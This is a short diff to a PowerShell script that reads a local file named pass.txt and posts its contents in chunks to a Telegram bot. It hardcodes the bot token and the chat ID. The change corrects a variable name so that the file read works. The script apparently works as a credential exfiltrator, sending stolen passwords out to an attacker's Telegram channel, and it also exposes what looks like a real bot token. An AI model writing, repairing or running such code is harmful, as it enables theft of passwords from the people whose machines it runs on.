@@ -3,9 +3,8 @@ $botToken = "6899690141:AAENcDCrG8znTahm-5WB8R7UIZoOPEZTSBQ"  # Replace with you
 $chatId = "5998953011"      # Replace with your chat ID
 $filePath = "pass.txt"  # Path to your text file
 
-
 # Read the content of the text file
-$textContent = Get-Content -Path $textFilePath -Raw
+$textContent = Get-Content -Path $filePath -Raw  # Corrected variable name
 
 # Define the API URL for sending messages
 $apiUrl = "https://api.telegram.org/bot$botToken/sendMessage"
@@ -34,3 +33,4 @@ foreach ($chunk in $chunks) {
     Invoke-RestMethod -Uri $apiUrl -Method Post -Body $payload
     Start-Sleep -Seconds 1  # Optional: to avoid hitting rate limits
 }
+
